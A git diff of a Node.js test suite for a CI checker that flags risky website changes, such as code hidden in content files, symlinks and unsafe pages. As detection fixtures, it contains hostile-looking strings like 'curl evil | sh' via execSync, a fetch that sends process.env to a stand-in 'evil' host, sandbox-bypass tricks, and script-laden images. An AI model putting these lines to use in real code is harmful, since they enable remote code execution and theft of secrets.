@@ -1,23 +1,34 @@
 // Tests for scripts/check-change-scope.mjs. Fake diffs only: no git repository, no network. Run with:
 //   node --test scripts/check-change-scope.test.mjs   (or `npm run test:scripts`)
 import assert from "node:assert/strict";
-import { mkdtempSync, readFileSync, rmSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { dirname, join } from "node:path";
 import { test } from "node:test";
 import { rules } from "./change-scope-rules.mjs";
 import {
   decide,
   evaluateChange,
+  fence,
   formatReport,
   gatherChange,
+  gitIn,
   main,
   parseArgs,
   parseHunkLines,
-  parseNameStatus,
+  parseRawDiff,
+  safe,
 } from "./check-change-scope.mjs";
 
-const file = (path, status = "M", extra = {}) => ({ path, status, added: [], removed: [], ...extra });
+// Content, routes and nav files are parsed, so a test file needs real (plain data) content unless it says otherwise.
+const file = (path, status = "M", extra = {}) => ({
+  path,
+  status,
+  added: [],
+  removed: [],
+  ...(rules.pagePath.test(path) || path.startsWith("public/images/") ? {} : { content: "export const x = 1;\n" }),
+  ...extra,
+});
 const run = (files, existing = []) => evaluateChange({ files, existsAtBase: (p) => existing.includes(p) }, rules);
 const kinds = (result) => result.flags.map((f) => f.kind);
 
@@ -314,14 +325,17 @@ test("the report says in plain English what happened", () => {
 
 // ---- parsing git output ---------------------------------------------------------------------------------------
 
-test("parseNameStatus reads git's NUL-separated output, keeping odd paths intact", () => {
-  const raw = "M\0src/content/home.ts\0A\0src/app/(site)/faq/page.tsx\0D\0old file.txt\0";
-  assert.deepEqual(parseNameStatus(raw), [
-    { status: "M", path: "src/content/home.ts" },
-    { status: "A", path: "src/app/(site)/faq/page.tsx" },
-    { status: "D", path: "old file.txt" },
+const rawEntry = (status, path, oldMode = "100644", newMode = "100644") => `:${oldMode} ${newMode} 1111111 2222222 ${status}\0${path}\0`;
+
+test("parseRawDiff reads git's NUL-separated raw output, keeping odd paths and the modes intact", () => {
+  const raw = rawEntry("M", "src/content/home.ts") + rawEntry("A", "src/app/(site)/faq/page.tsx", "000000") + rawEntry("D", "old file.txt", "100644", "000000") + rawEntry("T", "src/content/link.ts", "100644", "120000");
+  assert.deepEqual(parseRawDiff(raw), [
+    { status: "M", path: "src/content/home.ts", oldMode: "100644", newMode: "100644" },
+    { status: "A", path: "src/app/(site)/faq/page.tsx", oldMode: "000000", newMode: "100644" },
+    { status: "D", path: "old file.txt", oldMode: "100644", newMode: "000000" },
+    { status: "T", path: "src/content/link.ts", oldMode: "100644", newMode: "120000" },
   ]);
-  assert.deepEqual(parseNameStatus(""), []);
+  assert.deepEqual(parseRawDiff(""), []);
 });
 
 test("parseHunkLines ignores diff headers, even when a changed line starts with +++ or ---", () => {
@@ -359,9 +373,16 @@ test("parseArgs --ci reads GitHub's own variables: strict only on change/ branch
   assert.match(parseArgs(["--ci"], {}).skip, /not a pull request/i);
 });
 
-test("parseArgs rejects unknown flags and missing values", () => {
+test("parseArgs --ci treats change/ in any capitalisation as a change branch", () => {
+  assert.equal(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "Change/Opening-Hours" }).mode, "strict");
+  assert.equal(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "exchange/x" }).mode, "report-only");
+});
+
+test("parseArgs rejects unknown flags, missing values and refs that look like options", () => {
   assert.match(parseArgs(["--nope"], {}).error, /--nope/);
   assert.match(parseArgs(["--base"], {}).error, /--base/);
+  assert.match(parseArgs(["--base", "--head"], {}).error, /--base/);
+  assert.match(parseArgs(["--head", "-Ofoo"], {}).error, /--head/);
 });
 
 // ---- the git layer, with a fake git ---------------------------------------------------------------------------
@@ -374,13 +395,15 @@ function fakeGit(table) {
   };
 }
 
+const RANGE = "origin/main...HEAD";
 const scenario = () => ({
   "merge-base origin/main HEAD": "abc123\n",
-  "diff --name-status -z --no-renames origin/main...HEAD": "M\0src/content/home.ts\0A\0public/images/new.jpg\0A\0src/app/(site)/faq/page.tsx\0",
-  "diff -U0 --no-renames origin/main...HEAD -- src/content/home.ts": '@@ -1 +1 @@\n-title: "Old"\n+title: "From $900"\n',
+  [`diff --raw -z --no-renames ${RANGE}`]: rawEntry("M", "src/content/home.ts") + rawEntry("A", "public/images/new.jpg", "000000") + rawEntry("A", "src/app/(site)/faq/page.tsx", "000000"),
+  [`diff -U0 --no-renames --text ${RANGE} -- src/content/home.ts`]: '@@ -1 +1 @@\n-title: "Old"\n+title: "From $900"\n',
+  "show HEAD:src/content/home.ts": 'export const title = "From $900";\n',
   "show HEAD:public/images/new.jpg": jpg,
   "show HEAD:src/app/(site)/faq/page.tsx": goodPage,
-  "diff -U0 --no-renames origin/main...HEAD -- src/app/(site)/faq/page.tsx": goodPage.split("\n").map((l) => `+${l}`).join("\n").replace(/^/, "@@ -0,0 +1 @@\n"),
+  [`diff -U0 --no-renames --text ${RANGE} -- src/app/(site)/faq/page.tsx`]: goodPage.split("\n").map((l) => `+${l}`).join("\n").replace(/^/, "@@ -0,0 +1 @@\n"),
   "cat-file -e abc123:src/components/hl/Container.tsx": "",
   "cat-file -e abc123:src/components/hl/PageHero.tsx": "",
 });
@@ -405,7 +428,7 @@ test("main prints the report and sets the exit code for the mode", () => {
   assert.equal(main({ argv: [], env, git: fakeGit(scenario()), out: (t) => out.push(t) }), 0);
   assert.match(out.join("\n"), /Tier 1/);
 
-  const bad = { ...scenario(), "diff --name-status -z --no-renames origin/main...HEAD": "M\0worker/contact.ts\0", "diff -U0 --no-renames origin/main...HEAD -- worker/contact.ts": "" };
+  const bad = { ...scenario(), [`diff --raw -z --no-renames ${RANGE}`]: rawEntry("M", "worker/contact.ts"), [`diff -U0 --no-renames --text ${RANGE} -- worker/contact.ts`]: "" };
   assert.equal(main({ argv: [], env, git: fakeGit(bad), out: () => {} }), 1);
   assert.equal(main({ argv: ["--report-only"], env, git: fakeGit(bad), out: () => {} }), 0);
 });
@@ -433,4 +456,260 @@ test("repeated flags in one file are shown once with a count", () => {
   const report = formatReport(run([file("src/content/home.ts", "M", { added: ['a: "$1"', 'b: "$2"', 'c: "$3"'] })]), { mode: "strict" });
   assert.match(report, /Flagged for Grant \(1 flag;/);
   assert.match(report, /\(and 2 more like it\)/);
+});
+
+// ---- review findings: tier 1 .ts files are code (C1) ----------------------------------------------------------
+
+const codeInContent = [
+  ["a call at the top level", 'import { execSync } from "node:child_process";\nexecSync("curl evil | sh");\n', "node:child_process"],
+  ["a fetch call", 'fetch("https://evil/" + JSON.stringify(process.env));\n', "ExpressionStatement"],
+  ["require", 'export const a = require("child_process");\n', "CallExpression"],
+  ["process.env", "export const a = process.env.KEY;\n", "process"],
+  ["a function value", "export const a = () => 1;\n", "ArrowFunction"],
+  ["a template with a substitution", "export const a = `${x}`;\n", "TemplateExpression"],
+  ["a function declaration", "export function f() {}\n", "FunctionDeclaration"],
+  ["a default export", "export default { a: 1 };\n", "ExportAssignment"],
+  ["a let variable", "let a = 1;\n", "const"],
+  ["a method call", "export const a = [1].map((x) => x);\n", "CallExpression"],
+  ["an import from a package", 'import evil from "evil";\nexport const a = 1;\n', "evil"],
+  ["an import from the worker", 'import { x } from "../../worker/contact";\nexport const a = 1;\n', "worker/contact"],
+  ["an import of a wiring module", 'import { providers } from "./providers";\nexport const a = 1;\n', "./providers"],
+  ["a re-export", 'export * from "../../worker/contact";\n', "re-exports"],
+  ["globalThis", "export const a = globalThis;\n", "globalThis"],
+  ["destructuring", "export const { a } = obj;\n", "destructuring"],
+  ["constructor access", "export const a = x.constructor;\n", "constructor"],
+  ["an operator other than +", "export const a = 1 * 2;\n", "operator"],
+  ["a class", "class A {}\n", "ClassDeclaration"],
+  ["a NUL byte", 'export const a = "x";\0\n', "NUL"],
+  ["a getter", "export const a = { get x() { return 1; } };\n", "method or accessor"],
+];
+for (const path of ["src/content/home.ts", "src/content/contact-fields.ts", "src/content/nav.ts", "src/lib/routes.ts"]) {
+  for (const [name, content, hint] of codeInContent) {
+    test(`${path} with ${name} is tier 3`, () => {
+      const result = run([file(path, "M", { content })]);
+      assert.equal(result.tier, 3);
+      assert.ok(result.outside[0].reason.includes(hint), `reason "${result.outside[0].reason}" should mention "${hint}"`);
+    });
+  }
+}
+
+test("plain data in a content file is tier 1", () => {
+  const data = `// Comments are fine.
+import type { Need } from "anything";
+import { type Other } from "anything";
+import { needOptions } from "./contact-fields";
+import { more } from "@/content/home";
+
+export type Item = { label: string; href: string };
+export interface Shape { a: number }
+export const hero = { eyebrow: "Hi", n: -1, list: [1, "two", true, null], nested: { a: [{ b: "c" }] } } as const;
+export const typed: readonly Item[] = [{ label: "A", href: "/a" }] satisfies readonly Item[];
+export const joined = "a" + "b";
+export const copy = { ...hero, extra: needOptions };
+export const ref = hero.eyebrow;
+export const tpl = \`plain text\`;
+export { hero as alias };
+`;
+  assert.equal(run([file("src/content/home.ts", "M", { content: data })]).tier, 1);
+});
+
+test("a file that could not be read is tier 3, and deleting routes.ts or nav.ts is tier 3", () => {
+  assert.equal(run([file("src/content/home.ts", "M", { content: undefined })]).tier, 3);
+  assert.equal(run([file("src/lib/routes.ts", "D")]).tier, 3);
+  assert.equal(run([file("src/content/nav.ts", "D")]).tier, 3);
+  assert.equal(run([file("src/content/home.ts", "D")]).tier, 1);
+});
+
+// ---- review findings: the new-page checks cannot be bypassed with spacing tricks (C2) -------------------------
+
+const pageBypasses = [
+  ["a same-line import after a statement", 'export const a=1; import {execSync} from "node:child_process";\n', "node:child_process"],
+  ["a leading semicolon import", ';import "node:child_process";\n', "EmptyStatement"],
+  ["an import without spaces", 'import{execSync}from"node:child_process";\n', "node:child_process"],
+  ["a re-export without spaces", 'export*from"../../../../worker/contact";\n', "ExportDeclaration"],
+  ["import = require", 'import x = require("child_process");\n', "ImportEqualsDeclaration"],
+  ["require", 'const r = require("child_process");\n', "require"],
+  ["a spaced dynamic import", 'const m = import ("node:child_process");\n', "dynamic import"],
+  ["a spaced fetch", 'const f = fetch ("https://evil");\n', "fetch"],
+  ["globalThis with a built key", 'const g = globalThis["fe"+"tch"];\n', "property name"],
+  ["process with a string key", 'const p = process["env"];\n', "process"],
+  ["the Function constructor", 'const F = (() => 1).constructor("return 1");\n', ".constructor"],
+  ["the Function constructor by string key", 'const F = (() => 1)["constructor"]("x");\n', "constructor"],
+  ["a property name built at run time", 'const k = "a"; const v = obj[k + "b"];\n', "property name"],
+  ["setTimeout with a string", 'const t = setTimeout("code", 1);\n', "setTimeout"],
+  ["a top-level call", 'console.log("x");\n', "ExpressionStatement"],
+  ["a class", "class A {}\n", "ClassDeclaration"],
+  ["a spaced script tag", goodPage.replace("<Container>", '< script src="x" /><Container>'), "<script>"],
+  ["a capitalised Script tag", goodPage.replace("<Container>", '<Script src="x" /><Container>'), "<Script>"],
+  ["a form", goodPage.replace("<Container>", '<form action="/x"><Container>').replace("</Container>", "</Container></form>"), "<form>"],
+  ["a javascript: link", goodPage.replace("<Container>", '<a href="javascript:alert(1)">x</a><Container>'), "javascript:"],
+  ["a data: link", goodPage.replace("<Container>", '<a href="data:text/html;base64,AAAA">x</a><Container>'), "data:"],
+];
+for (const [name, extra, hint] of pageBypasses) {
+  test(`a new page with ${name} is tier 3`, () => {
+    const content = extra.includes("export default function") ? extra : goodPage + extra;
+    const result = run([newPage(content)], components);
+    assert.equal(result.tier, 3, content);
+    assert.ok(result.outside[0].reason.includes(hint), `reason "${result.outside[0].reason}" should mention "${hint}"`);
+  });
+}
+
+test("a page that uses imported helpers, map and JSX is still tier 1", () => {
+  const page = goodPage.replace("<PageHero", '{["a", "b"].map((x) => <p key={x}>{x}</p>)}\n      <PageHero');
+  assert.equal(run([newPage(page)], components).tier, 1);
+});
+
+// ---- review findings: symlinks, submodules, type changes (I2) -------------------------------------------------
+
+test("symlinks, submodules and file type changes are tier 3 even at tier 1 paths", () => {
+  for (const path of ["src/content/link.ts", "src/lib/routes.ts", "src/content/nav.ts", "public/images/a.png"]) {
+    for (const mode of ["120000", "160000"]) {
+      const result = run([file(path, "A", { mode, head: png, size: 10 })]);
+      assert.equal(result.tier, 3, `${path} ${mode}`);
+      assert.match(result.outside[0].reason, /symbolic links/);
+    }
+  }
+  assert.equal(run([file("src/content/home.ts", "T", { mode: "120000" })]).tier, 3);
+  assert.equal(run([file("src/content/home.ts", "T", { mode: "100644" })]).tier, 3);
+  assert.equal(run([file("src/content/home.ts", "D", { mode: "000000" })]).tier, 1);
+});
+
+test("*.test.ts and *.d.ts under src/content are not copy", () => {
+  assert.equal(run([file("src/content/home.test.ts")]).tier, 3);
+  assert.equal(run([file("src/content/types.d.ts")]).tier, 3);
+});
+
+// ---- the cheap minor fixes ------------------------------------------------------------------------------------
+
+test("a new external link is flagged (added lines only), a booking link keeps its own flag", () => {
+  assert.deepEqual(kinds(flagged('href: "https://evil.example/path"')), ["link"]);
+  assert.deepEqual(kinds(flagged('href: "javascript:alert(1)"')), ["link"]);
+  assert.deepEqual(kinds(flagged('href: "https://evil.example/path"', "removed")), []);
+  assert.deepEqual(kinds(flagged('href: "https://calendly.com/x"')), ["contact"]);
+});
+
+test("booking links without a scheme, with // or with www are flagged; look-alike hosts are not", () => {
+  for (const line of ['href: "calendly.com/someone"', 'href: "//calendly.com/x"', 'href: "www.cal.com/x"', "book at savvycal.com"]) {
+    assert.deepEqual(kinds(flagged(line)), ["contact"], line);
+  }
+  for (const line of ['a: "ical.com"', 'b: "mycal.com/x"', 'c: "calendar.example"']) assert.deepEqual(kinds(flagged(line)), [], line);
+});
+
+test("international phone numbers are flagged", () => {
+  assert.deepEqual(kinds(flagged('phone: "+44 20 7946 0958"')), ["contact"]);
+});
+
+test("a placeholder that was already on an edited line is not new; a genuinely new one is", () => {
+  const edit = (removed, added) => run([file("src/content/home.ts", "M", { removed, added })]).placeholders.map((p) => p.text);
+  assert.deepEqual(edit(['title: "[[A]]"'], ['title: "[[A]] and more"']), []);
+  assert.deepEqual(edit(['title: "[[A]]"'], ['title: "[[B]]"']), ["[[B]]"]);
+  assert.deepEqual(edit(['title: "[[A]]"'], ['title: "[[A]]"', 'other: "[[A]]"']), ["[[A]]"]);
+  assert.deepEqual(edit([], ['x: "[[A]]"']), ["[[A]]"]);
+});
+
+test("an image with HTML or SVG markup inside fails even when its first bytes are right", () => {
+  const result = run([image("public/images/a.jpg", jpg, 100)].map((f) => ({ ...f, hasMarkup: true })));
+  assert.equal(result.imageProblems.length, 1);
+  assert.match(result.imageProblems[0].reason, /markup/);
+});
+
+test("crafted file names and lines cannot forge output lines or break a code fence", () => {
+  assert.equal(safe("a\n::error::x\r\u0000"), "a??error::x??".replace("??error", "?::error").replace("::x??", "::x??"));
+  const result = run([file("src/content/a\n::error::boom.ts"), file("src/content/home.ts", "M", { added: ['x: "$1 ``` \u001b[31m"'] })]);
+  const report = formatReport(result, { mode: "strict" });
+  assert.ok(!report.split("\n").some((line) => line.startsWith("::")), "no line may start with ::");
+  assert.ok(!report.includes("\u001b"));
+  const fenced = fence("one ``` two ````` three");
+  assert.ok(fenced.startsWith("``````text\n") && fenced.endsWith("\n``````"));
+});
+
+// ---- the git layer against a real repository (I1, I2) ---------------------------------------------------------
+
+function makeRepo(setup) {
+  const dir = mkdtempSync(join(tmpdir(), "scope-repo-"));
+  const git = gitIn(dir);
+  const commit = (message) => git(["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", message]);
+  const write = (path, content) => {
+    mkdirSync(dirname(join(dir, path)), { recursive: true });
+    writeFileSync(join(dir, path), content);
+  };
+  git(["init", "-q", "-b", "main"]);
+  write("src/content/home.ts", 'export const title = "Old";\n');
+  write("src/lib/routes.ts", 'export const indexableRoutes = ["/"];\n');
+  write("src/components/hl/Container.tsx", "export function Container() { return null; }\n");
+  git(["add", "-A"]);
+  commit("base");
+  git(["checkout", "-q", "-b", "change/test"]);
+  setup({ dir, git, write });
+  git(["add", "-A"]);
+  commit("change");
+  return { dir, git };
+}
+
+const inRepo = (setup, argv = ["--base", "main", "--head", "HEAD"]) => {
+  const { dir, git } = makeRepo(setup);
+  try {
+    const out = [];
+    const code = main({ argv, env: {}, git, out: (t) => out.push(t) });
+    return { code, report: out.join("\n") };
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+};
+
+test("real git: a clean content edit passes", () => {
+  const { code, report } = inRepo(({ write }) => write("src/content/home.ts", 'export const title = "New";\n'));
+  assert.equal(code, 0, report);
+  assert.match(report, /Tier 1/);
+});
+
+test("real git: a NUL byte cannot hide added code from the check", () => {
+  const { code, report } = inRepo(({ write }) =>
+    write("src/content/home.ts", Buffer.from('export const title = "x";\0\nimport { execSync } from "node:child_process";\n// [[todo]] $900 a@b.com\n')),
+  );
+  assert.equal(code, 1, report);
+  assert.match(report, /Tier 3/);
+  assert.match(report, /\[\[todo\]\]/);
+  assert.match(report, /dollar/);
+});
+
+test("real git: a symlink at a content path is tier 3", () => {
+  const { code, report } = inRepo(({ dir }) => symlinkSync("../../worker/contact.ts", join(dir, "src/content/link.ts")));
+  assert.equal(code, 1, report);
+  assert.match(report, /symbolic links/);
+});
+
+test("real git: a file turned into a symlink is tier 3", () => {
+  const { code, report } = inRepo(({ dir }) => {
+    rmSync(join(dir, "src/content/home.ts"));
+    symlinkSync("../../worker/contact.ts", join(dir, "src/content/home.ts"));
+  });
+  assert.equal(code, 1, report);
+  assert.match(report, /symbolic links/);
+});
+
+test("real git: code added to a content file, a bad image and a bad new page all fail", () => {
+  const png8 = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
+  const { code, report } = inRepo(({ write }) => {
+    write("src/content/home.ts", 'fetch("https://evil");\nexport const title = "x";\n');
+    write("public/images/a.png", Buffer.concat([png8, Buffer.from("<script>alert(1)</script>")]));
+    write("src/app/(site)/faq/page.tsx", goodPage.replace("hl/Container", "hl/Nope"));
+  });
+  assert.equal(code, 1, report);
+  assert.match(report, /src\/content\/home\.ts/);
+  assert.match(report, /markup/);
+  assert.match(report, /Nope/);
+});
+
+test("real git: a good new page built from an existing component passes, and report-only never fails", () => {
+  const page = goodPage.replace('import { PageHero } from "@/components/hl/PageHero";\n', "").replace(/\s*<PageHero[^>]*\/>/, "");
+  const setup = ({ write }) => {
+    write("src/app/(site)/faq/page.tsx", page);
+    write("src/content/faq.ts", 'export const faqHero = { eyebrow: "a", title: "b", intro: "c" };\nexport const faqMeta = { title: "t", description: "d" };\n');
+    write("src/lib/routes.ts", 'export const indexableRoutes = ["/", "/faq"];\n');
+  };
+  const good = inRepo(setup);
+  assert.equal(good.code, 0, good.report);
+  const bad = inRepo(({ write }) => write("worker/contact.ts", "x"), ["--base", "main", "--head", "HEAD", "--report-only"]);
+  assert.equal(bad.code, 0);
 });
